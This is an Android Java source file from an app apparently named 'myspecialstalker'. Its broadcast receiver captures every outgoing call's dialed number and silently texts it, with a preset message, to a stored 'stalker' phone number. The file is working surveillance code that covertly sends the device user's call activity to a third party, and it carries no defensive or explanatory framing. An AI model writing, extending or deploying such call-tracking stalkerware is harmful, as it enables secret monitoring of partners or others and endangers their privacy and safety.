package com.example.myspecialstalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

public class OutgoingCallBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent)
    {
        if (MainActivity.isReadyToSend())
        {
            if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction()))
            {
                String calledNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                String message = MainActivity.getStalkerMessage() + " " + calledNumber;
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(MainActivity.getStalkerNumber(),
                        null, message,
                        null,
                        null);
            }
        }
    }
}
